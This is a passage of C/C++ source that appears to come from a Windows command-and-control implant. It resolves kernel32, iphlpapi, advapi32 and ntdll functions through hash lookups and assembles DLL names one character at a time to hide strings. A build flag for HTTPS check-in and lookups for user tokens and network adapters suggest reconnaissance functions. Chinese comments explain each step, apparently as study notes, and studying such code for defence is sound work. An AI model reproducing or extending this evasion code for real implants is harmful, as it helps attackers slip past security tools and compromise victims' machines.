		ApiWin->GetDriveTypeA			= (decltype(GetDriveTypeA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETDRIVETYPEA);
		ApiWin->GetFileSize				= (decltype(GetFileSize)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETFILESIZE);
		ApiWin->GetFileAttributesA		= (decltype(GetFileAttributesA)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETFILEATTRIBUTESA);
		ApiWin->GetFullPathNameA		= (decltype(GetFullPathNameA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETFULLPATHNAMEA);
#endif
		ApiWin->GetLastError			= (decltype(GetLastError)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETLASTERROR);
#if !DIRECT_HTTPS_CHECKIN_ONLY
		ApiWin->GetLogicalDrives		= (decltype(GetLogicalDrives)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETLOGICALDRIVES);
#endif
		ApiWin->GetOEMCP				= (decltype(GetOEMCP)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETOEMCP);
		ApiWin->GetModuleBaseNameA		= (decltype(GetModuleBaseNameA)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_K32GETMODULEBASENAMEA);
		ApiWin->GetModuleHandleA		= (decltype(GetModuleHandleA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETMODULEHANDLEA);
		ApiWin->GetLocalTime			= (decltype(GetLocalTime)*)            GetSymbolAddress(hKernel32Module, HASH_FUNC_GETLOCALTIME);
		ApiWin->GetSystemTimeAsFileTime = (decltype(GetSystemTimeAsFileTime)*) GetSymbolAddress(hKernel32Module, HASH_FUNC_GETSYSTEMTIMEASFILETIME);
		ApiWin->GetProcAddress			= (decltype(GetProcAddress)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETPROCADDRESS);
		ApiWin->GetTickCount			= (decltype(GetTickCount)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETTICKCOUNT);
		ApiWin->GetTimeZoneInformation	= (decltype(GetTimeZoneInformation)*)  GetSymbolAddress(hKernel32Module, HASH_FUNC_GETTIMEZONEINFORMATION);
		ApiWin->HeapAlloc				= (decltype(HeapAlloc)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_HEAPALLOC);
		ApiWin->HeapCreate				= (decltype(HeapCreate)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_HEAPCREATE);
		ApiWin->HeapDestroy				= (decltype(HeapDestroy)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_HEAPDESTROY);
		ApiWin->HeapReAlloc				= (decltype(HeapReAlloc)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_HEAPREALLOC);
		ApiWin->HeapFree				= (decltype(HeapFree)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_HEAPFREE);
		ApiWin->IsWow64Process			= (decltype(IsWow64Process)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_ISWOW64PROCESS);
		ApiWin->LocalAlloc				= allocProc;
		ApiWin->LocalFree				= (decltype(LocalFree)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_LOCALFREE);
		ApiWin->LocalReAlloc			= (decltype(LocalReAlloc)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_LOCALREALLOC);
#if !DIRECT_HTTPS_CHECKIN_ONLY
		ApiWin->MoveFileA				= (decltype(MoveFileA)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_MOVEFILEA);
		ApiWin->PeekNamedPipe			= (decltype(PeekNamedPipe)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_PEEKNAMEDPIPE);
		ApiWin->ReadFile                = (decltype(ReadFile)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_READFILE);
		ApiWin->RemoveDirectoryA        = (decltype(RemoveDirectoryA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_REMOVEDIRECTORYA);
		ApiWin->SetCurrentDirectoryA    = (decltype(SetCurrentDirectoryA)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_SETCURRENTDIRECTORYA);
#endif
		ApiWin->Sleep					= (decltype(Sleep)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_SLEEP);
#if !DIRECT_HTTPS_CHECKIN_ONLY
		ApiWin->WriteFile				= (decltype(WriteFile)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_WRITEFILE);
#endif

		// iphlpapi：
		// 这里没有直接写字符串字面量 "Iphlpapi.dll"，而是逐字符拼出来。
		// 当前 HdChrA 不做实际变换，但保留了未来字符串变换/隐藏的位置。
		CHAR iphlpapi_c[13];
		iphlpapi_c[0]  = HdChrA('I');
		iphlpapi_c[1]  = HdChrA('p');
		iphlpapi_c[2]  = HdChrA('h');
		iphlpapi_c[3]  = HdChrA('l');
		iphlpapi_c[4]  = HdChrA('p');
		iphlpapi_c[5]  = HdChrA('a');
		iphlpapi_c[6]  = HdChrA('p');
		iphlpapi_c[7]  = HdChrA('i');
		iphlpapi_c[8]  = HdChrA('.');
		iphlpapi_c[9]  = HdChrA('d');
		iphlpapi_c[10] = HdChrA('l');
		iphlpapi_c[11] = HdChrA('l');
		iphlpapi_c[12] = HdChrA(0);
	
		HMODULE hIphlpapiModule = ApiWin->LoadLibraryA(iphlpapi_c);
		SysModules->Iphlpapi = hIphlpapiModule;
		if (hIphlpapiModule) {
			ApiWin->GetAdaptersInfo = (decltype(GetAdaptersInfo)*) GetSymbolAddress(hIphlpapiModule, HASH_FUNC_GETADAPTERSINFO);
		}

		// advapi32：
		// 用于用户名、token 等权限/身份信息。
		CHAR advapi32_c[13];
		advapi32_c[0]  = HdChrA('A');
		advapi32_c[1]  = HdChrA('d');
		advapi32_c[2]  = HdChrA('v');
		advapi32_c[3]  = HdChrA('a');
		advapi32_c[4]  = HdChrA('p');
		advapi32_c[5]  = HdChrA('i');
		advapi32_c[6]  = HdChrA('3');
		advapi32_c[7]  = HdChrA('2');
		advapi32_c[8]  = HdChrA('.');
		advapi32_c[9]  = HdChrA('d');
		advapi32_c[10] = HdChrA('l');
		advapi32_c[11] = HdChrA('l');
		advapi32_c[12] = HdChrA(0);

		HMODULE hAdvapi32Module = ApiWin->LoadLibraryA(advapi32_c);
		SysModules->Advapi32 = hAdvapi32Module;
		if (hAdvapi32Module) {
			ApiWin->GetTokenInformation		= (decltype(GetTokenInformation)*)     GetSymbolAddress(hAdvapi32Module, HASH_FUNC_GETTOKENINFORMATION);
			ApiWin->GetUserNameA			= (decltype(GetUserNameA)*)		       GetSymbolAddress(hAdvapi32Module, HASH_FUNC_GETUSERNAMEA);
		}
	}
	else {
		return FALSE;
	}

	// ntdll：
	// 这里解析更底层的 NTAPI/RTL API。
	// 这些函数也全部通过 hash 常量查找。
	if (ApiNt) {
		HMODULE hNtdllModule = GetModuleAddress(HASH_LIB_NTDLL);
		SysModules->Ntdll = hNtdllModule;
		if ( hNtdllModule ) {
			// ntdll 函数表：
			// - NtClose：关闭句柄。
			// - NtQuerySystemInformation：查询系统级信息。
			// - NtOpenProcessToken：打开进程 token。
			// - NtTerminateProcess：结束进程。
			// - RtlGetVersion：读取 Windows 版本。
			// - RtlExitUserThread / RtlExitUserProcess：退出线程/进程。
			// - RtlIpv4StringToAddressA：把 IPv4 字符串转换成地址。
			// - RtlRandomEx：生成随机数。
			// - RtlNtStatusToDosError：把 NTSTATUS 转成 Win32 错误码。
			ApiNt->NtClose                   = (decltype(NtClose)*)					  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTCLOSE);
			ApiNt->NtQuerySystemInformation  = (decltype(NtQuerySystemInformation)*)  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTQUERYSYSTEMINFORMATION);
			ApiNt->NtOpenProcessToken        = (decltype(NtOpenProcessToken)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTOPENPROCESSTOKEN);
			ApiNt->NtTerminateProcess        = (decltype(NtTerminateProcess)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTTERMINATEPROCESS);
			ApiNt->RtlGetVersion             = (decltype(RtlGetVersion)*)			  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLGETVERSION);
			ApiNt->RtlExitUserThread         = (decltype(RtlExitUserThread)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLEXITUSERTHREAD);
			ApiNt->RtlExitUserProcess        = (decltype(RtlExitUserProcess)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLEXITUSERPROCESS);
			ApiNt->RtlIpv4StringToAddressA   = (decltype(RtlIpv4StringToAddressA)*)	  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLIPV4STRINGTOADDRESSA);
			ApiNt->RtlRandomEx               = (decltype(RtlRandomEx)*)				  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLRANDOMEX);
			ApiNt->RtlNtStatusToDosError     = (decltype(RtlNtStatusToDosError)*)	  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLNTSTATUSTODOSERROR);
		}
		else {
			return FALSE;
		}
	}
	else {
		return FALSE;
	}
	// hash 模式这里没有逐项检查所有函数指针是否非空，只要主要流程没有失败就返回 TRUE。
	// 这和上面的明文/minimal 分支不同；如果后续要更严格，也可以补一个完整健康检查。
	return TRUE;
}

#endif
